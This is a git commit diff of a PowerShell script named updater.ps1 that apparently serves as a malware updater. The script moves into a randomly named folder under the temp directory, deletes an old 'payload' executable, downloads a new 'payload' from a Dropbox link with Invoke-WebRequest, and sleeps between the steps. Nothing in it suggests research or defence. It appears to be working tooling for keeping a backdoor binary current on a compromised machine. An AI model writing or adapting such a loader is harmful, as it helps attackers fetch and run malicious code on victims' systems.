3f75ba1f1cee2b894c5f1dc5cc1275771aa5567f
blousekool <132397759+blousekool@users.noreply.github.com>
2023-08-09 23:05:52 +0200

    updater.ps1

--- bd/updater.ps1
+++ bd/updater.ps1
@@ -1,11 +1,14 @@
+#sleep
+start-sleep 10
+
+#remove old payload
+remove-item wsappa.exe
+
 #change directory
 cd $env:temp/sVBXKuz
 
 #download updated payload
 Invoke-WebRequest -Uri "dl.dropboxusercontent.com/s/2i65z3pifh3g6l3abdkmo/wsappa-1.3.exe?rlkey=2bhr3ngxax326luqhao7e6304&dl=0" -OutFile new_wsappa.exe
-
-#remove old payload
-remove-item wsappa.exe
 
 #sleep
 start-sleep 5
